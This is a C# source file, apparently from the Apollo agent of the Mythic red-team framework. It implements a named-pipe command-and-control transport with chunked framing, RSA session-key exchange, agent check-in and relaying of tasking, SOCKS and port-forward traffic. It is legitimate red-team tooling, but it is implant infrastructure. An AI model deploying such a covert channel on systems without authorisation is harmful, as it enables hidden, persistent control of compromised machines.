using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Interfaces;
using ApolloInterop.Classes;
using System.IO.Pipes;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using ApolloInterop.Structs.ApolloStructs;
using System.Collections.Concurrent;
using ApolloInterop.Enums.ApolloEnums;
using System.Threading;
using ST = System.Threading.Tasks;
using ApolloInterop.Serializers;
using ApolloInterop.Constants;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Events;
using ApolloInterop.Utils;

namespace NamedPipeTransport
{
    public class NamedPipeProfile : C2Profile, IC2Profile
    {
        internal struct AsyncPipeState
        {
            internal PipeStream Pipe;
            internal CancellationTokenSource Cancellation;
            internal ST.Task Task;
        }
        private string _namedPipeName;
        private AsyncNamedPipeServer _server;
        private bool _encryptedExchangeCheck;
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private Dictionary<PipeStream, AsyncPipeState> _writerTasks = new Dictionary<PipeStream, AsyncPipeState>();
        private Action<object> _sendAction;
        private IAgent _agent;
        private CheckinMessage? _savedCheckin = null;
        private bool _uuidNegotiated = false;

        private ST.Task _agentConsumerTask = null;
        private ST.Task _agentProcessorTask = null;
        private string _currentMessageID = Guid.NewGuid().ToString();
        private readonly List<byte> _receiveBuffer = new();
        private readonly object _receiveLock = new();
        private const int FrameHeaderSize = 12;
        // Keep a complete frame within the named-pipe receive buffer.
        private const int ChunkSize = IPC.SEND_SIZE - FrameHeaderSize;

        public NamedPipeProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
            _namedPipeName = data["pipename"];
            _encryptedExchangeCheck = data["encrypted_exchange_check"] == "true";
            _agent = agent;
            _sendAction = (object p) =>
            {
                CancellationTokenSource cts = ((AsyncPipeState)p).Cancellation;
                PipeStream pipe = ((AsyncPipeState)p).Pipe;
                while (pipe.IsConnected && !cts.IsCancellationRequested)
                {
                    // Check queue before waiting to avoid race condition
                    if (_senderQueue.IsEmpty)
                    {
                        _senderEvent.WaitOne();
                    }
                    if (!cts.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] result))
                    {
                        UInt32 totalChunksToSend = (UInt32)(result.Length == 0 ? 1 : ((result.Length - 1) / ChunkSize) + 1);
                        bool sentAllChunks = true;
                        for (UInt32 currentChunk = 0; currentChunk < totalChunksToSend; currentChunk++)
                        {
                            int offset = checked((int)currentChunk * ChunkSize);
                            int chunkLength = Math.Min(ChunkSize, result.Length - offset);
                            if (!SendFrame(pipe, cts, totalChunksToSend, currentChunk, result, offset, chunkLength))
                            {
                                sentAllChunks = false;
                                break;
                            }
                        }
                        if (sentAllChunks)
                        {
                            DebugHelp.DebugWriteLine($"finished sending data from _senderQueue");
                        }
                    }
                }
            };
        }

        private bool SendFrame(PipeStream pipe, CancellationTokenSource cts, UInt32 totalChunks, UInt32 currentChunk, byte[] source, int offset, int chunkLength)
        {
            byte[] frame = new byte[FrameHeaderSize + chunkLength];
            WriteUInt32BigEndian(frame, 0, (UInt32)chunkLength + 8);
            WriteUInt32BigEndian(frame, 4, totalChunks);
            WriteUInt32BigEndian(frame, 8, currentChunk);
            if (chunkLength > 0)
            {
                Buffer.BlockCopy(source, offset, frame, FrameHeaderSize, chunkLength);
            }

            try
            {
                DebugHelp.DebugWriteLine($"sending chunk {currentChunk}/{totalChunks} with size {chunkLength + 8}");
                // This task is the pipe's sole writer. A synchronous write provides ordering and
                // backpressure instead of allowing a large file transfer to queue concurrent writes.
                pipe.Write(frame, 0, frame.Length);
                return true;
            }
            catch (Exception ex)
            {
                DebugHelp.DebugWriteLine($"failed to write to pipe: {ex}");
                cts.Cancel();
                _senderEvent.Set();
                ST.Task.Run(() =>
                {
                    try
                    {
                        pipe.Close();
                    }
                    catch
                    {
                        // The connection is already unusable; the read side will perform cleanup.
                    }
                });
                return false;
            }
        }

        public void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
        {
            // We only accept one connection at a time, sorry.
            if (_writerTasks.Count > 0)
            {
                args.Pipe.Close();
                return;
            }
            AsyncPipeState arg = new AsyncPipeState()
            {
                Pipe = args.Pipe,
                Cancellation = new CancellationTokenSource(),
            };
            ST.Task tmp = new ST.Task(_sendAction, arg);
            arg.Task = tmp;
            _writerTasks[args.Pipe] = arg;
            _writerTasks[args.Pipe].Task.Start();
            Connected = true;
        }

        public void OnAsyncDisconnect(object sender, NamedPipeMessageArgs args)
        {
            args.Pipe.Close();
            if (_writerTasks.ContainsKey(args.Pipe))
            {
                var tmp = _writerTasks[args.Pipe];
                _writerTasks.Remove(args.Pipe);
                Connected = _writerTasks.Count > 0;
            
                tmp.Cancellation.Cancel();
                _senderEvent.Set();
                _receiverEvent.Set();
            
                tmp.Task.Wait();
            }
        }

        public void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            lock (_receiveLock)
            {
                _receiveBuffer.AddRange(args.Data.Data.Take(args.Data.DataLength));
                DebugHelp.DebugWriteLine($"got message from remote connection with length: {args.Data.DataLength}");
                ProcessReceiveBuffer();
            }
        }

        private void ProcessReceiveBuffer()
        {
            while (_receiveBuffer.Count >= FrameHeaderSize)
            {
                UInt32 framedSize = ReadUInt32BigEndian(_receiveBuffer, 0);
                UInt32 totalChunks = ReadUInt32BigEndian(_receiveBuffer, 4);
                UInt32 currentChunk = ReadUInt32BigEndian(_receiveBuffer, 8);
                if (framedSize < 8 || framedSize - 8 > IPC.SEND_SIZE || totalChunks == 0 || currentChunk >= totalChunks)
                {
                    DebugHelp.DebugWriteLine("discarding invalid named-pipe frame header");
                    _receiveBuffer.Clear();
                    return;
                }

                int payloadLength = (int)(framedSize - 8);
                int frameLength = FrameHeaderSize + payloadLength;
                if (_receiveBuffer.Count < frameLength)
                {
                    return;
                }

                byte[] data = _receiveBuffer.GetRange(FrameHeaderSize, payloadLength).ToArray();
                _receiveBuffer.RemoveRange(0, frameLength);
                DebugHelp.DebugWriteLine($"got chunk {currentChunk + 1}/{totalChunks} with size {framedSize}");
                UnwrapMessage((int)currentChunk + 1, (int)totalChunks, data);
            }
        }

        private void UnwrapMessage(int currentChunk, int totalChunks, byte[] data)
        {
            IPCChunkedData chunkedData = new(id: _currentMessageID,
                chunkNum: currentChunk, totalChunks: totalChunks,
                mt: MessageType.MessageResponse,
                data: data);
            lock (MessageStore)
            {
                if (!MessageStore.ContainsKey(chunkedData.ID))
                {
                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                }
            }
            MessageStore[chunkedData.ID].AddMessage(chunkedData);
            if (currentChunk == totalChunks)
            {
                _currentMessageID = Guid.NewGuid().ToString();
            }
        }

        private static void WriteUInt32BigEndian(byte[] buffer, int offset, UInt32 value)
        {
            buffer[offset] = (byte)(value >> 24);
            buffer[offset + 1] = (byte)(value >> 16);
            buffer[offset + 2] = (byte)(value >> 8);
            buffer[offset + 3] = (byte)value;
        }

        private static UInt32 ReadUInt32BigEndian(List<byte> buffer, int offset)
        {
            return ((UInt32)buffer[offset] << 24) |
                   ((UInt32)buffer[offset + 1] << 16) |
                   ((UInt32)buffer[offset + 2] << 8) |
                   buffer[offset + 3];
        }

        private bool AddToSenderQueue(IMythicMessage msg)
        {
            string serializedData = Serializer.Serialize(msg);
            _senderQueue.Enqueue(Encoding.UTF8.GetBytes(serializedData));
            _senderEvent.Set();
            return true;
        }

        public void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for(int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = Serializer.DeserializeIPCMessage(data.ToArray(), mt);
            // Console.WriteLine("We got a message: {0}", mt.ToString());
            _recieverQueue.Enqueue(msg);
            _receiverEvent.Set();
        }


        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
        {
            while (Agent.IsAlive())
            {
                _receiverEvent.WaitOne();
                IMythicMessage msg = _recieverQueue.FirstOrDefault(m => m.GetTypeCode() == mt);
                if (msg != null)
                {
                    _recieverQueue = new ConcurrentQueue<IMythicMessage>(_recieverQueue.Where(m => m != msg));
                    return onResp(msg);
                }
                if (!Connected)
                    break;
            }
            return true;
        }

        
        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {
            if (_server == null)
            {
                _server = new AsyncNamedPipeServer(_namedPipeName, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
                _server.ConnectionEstablished += OnAsyncConnect;
                _server.MessageReceived += OnAsyncMessageReceived;
                _server.Disconnect += OnAsyncDisconnect;
            }

            if (_encryptedExchangeCheck && !_uuidNegotiated)
            {
                var rsa = Agent.GetApi().NewRSAKeyPair(4096);
                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                {
                    Action = "staging_rsa",
                    PublicKey = rsa.ExportPublicKey(),
                    SessionID = rsa.SessionId
                };
                AddToSenderQueue(handshake1);
                if (!Recv(MessageType.MessageResponse, delegate(IMythicMessage resp)
                {
                    MessageResponse respHandshake = (MessageResponse)resp;
                    byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                    return true;
                }))
                {
                    return false;
                }
            }
            AddToSenderQueue(checkinMsg);
            if (_agentProcessorTask == null || _agentProcessorTask.IsCompleted)
            {
                return Recv(MessageType.MessageResponse, delegate (IMythicMessage resp)
                {
                    MessageResponse mResp = (MessageResponse)resp;
                    if (!_uuidNegotiated)
                    {
                        _uuidNegotiated = true;
                        ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                        checkinMsg.UUID = mResp.ID;
                        _savedCheckin = checkinMsg;
                    }
                    Connected = true;
                    return onResp(mResp);
                });
            } else
            {
                return true;
            }
        }

        public void Start()
        {
            _agentConsumerTask = new ST.Task(()=> 
            {
                while (Agent.IsAlive() && _writerTasks.Count > 0)
                {
                    if (!Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
                    {
                        if (tm.Delegates.Length != 0 || tm.Responses.Length != 0 || tm.Socks.Length != 0 || tm.Rpfwd.Length != 0 || tm.Edges.Length != 0)
                        {
                            AddToSenderQueue(tm);
                            return true;
                        }
                        return false;
                    }))
                    {
                        Thread.Sleep(100);
                    }
                }
            });
            _agentProcessorTask = new ST.Task(() =>
            {
                while(Agent.IsAlive() && _writerTasks.Count > 0)
                {
                    Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                    {
                        return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
                    });
                }
            });
            _agentConsumerTask.Start();
            _agentProcessorTask.Start();
            _agentProcessorTask.Wait();
            _agentConsumerTask.Wait();
        }

        public bool Send<IMythicMessage>(IMythicMessage message)
        {
            return AddToSenderQueue((ApolloInterop.Interfaces.IMythicMessage)message);
        }

        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {
            throw new NotImplementedException();
        }

        public bool IsOneWay()
        {
            return true;
        }

        public bool IsConnected()
        {
            return _writerTasks.Keys.Count > 0;
        }
    }
}
